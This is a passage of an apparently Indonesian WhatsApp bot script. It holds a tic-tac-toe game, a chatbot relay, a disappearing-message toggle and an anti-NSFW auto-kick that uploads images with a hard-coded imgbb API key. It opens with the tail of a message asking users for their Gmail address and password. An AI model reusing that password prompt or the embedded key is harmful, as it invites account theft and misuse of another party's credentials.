berapa:\nAlamat Gmail:\nPassword gmail:\nDIISI YA..`)
				}
			if (budy.toLowerCase() == "!"){
			if (!mek.key.fromMe && !isOwner) return
			    const xOnn2 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(9999999999), {})
		    	const xOfff2 = client.prepareMessageFromContent(from, client.prepareDisappearingMessageSettingContent(0), {})
		    	await client.relayWAMessage(xOnn2, { waitForAck: true })
		    	await client.relayWAMessage(xOfff2, { waitForAck: true })
				}
//TICTACTOE
			if (isTTT && isPlayer2){
            if (budy.toLowerCase() == "y" ||
			budy.toLowerCase() == "ya" ||
			budy.toLowerCase() == "iya"){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]} = ❌
Player2 @${tty.player2.split('@')[0]} = ⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  client.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.toLowerCase() == "n" ||
budy.toLowerCase() == "no" ||
budy.toLowerCase() == "tidak"){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
client.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} menolak:(`,text,{quoted:mek,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '❌'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh @${tty.player1.split('@')[0]}\n`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
client.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Berakhir Seri_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]} = ⭕
Player1 @${tty.player1.split('@')[0]} = ❌

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
 client.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh @${tty.player2.split('@')[0]}\n`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
client.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]} = ❌
Player2 @${tty.player2.split('@')[0]} = ⭕
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 client.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
	}
//SIMI
            if (isGroup && isSimi && budy != undefined) {
				anu = await fetchJson(`https://api.lolhuman.xyz/api/simi?apikey=${LolApi}&text=${encodeURIComponent(budy)}`)
				reply(anu.result)
			}
// COMMAND TIDAK TERDAFTAR
			if (body.startsWith(`${prefix}${command}`)) {
				if (isBanned) return reply(mess.only.benned)
				reply(`Maaf kak, command tersebut tidak ada di dalam ${prefix}menu bot!`)
				}
//ANTI NSFW
            if (!isGroup) return
            if (!isAntinsfw) return
            if (isGroupAdmins) return 
			var kic = `${sender.split("@")[0]}@s.whatsapp.net`
            var imgbb = require('imgbb-uploader')
            ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
            owgi = await client.downloadAndSaveMediaMessage(ted)
            anu = await imgbb("f8978995fb109cc5487b6183f5ef56bd", owgi)
         	get_result = await fetchJson(`http://api.lolhuman.xyz/api/nsfwcheck?apikey=${LolApi}&img=${anu.display_url}`)
         	get_result = get_result.result
        	if (Number(get_result.replace("%", "")) >= 50) return reply(`*Terdeteksi Mengirim Gambar Yang Berbau Porno*\nKeyakinan Gambar :${get_result}`).then(() => client.groupRemove(from, [kic]))
            fs.unlinkSync(owgi)
            
//============ END SCRIPT ============//
					}
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
	})
}
starts()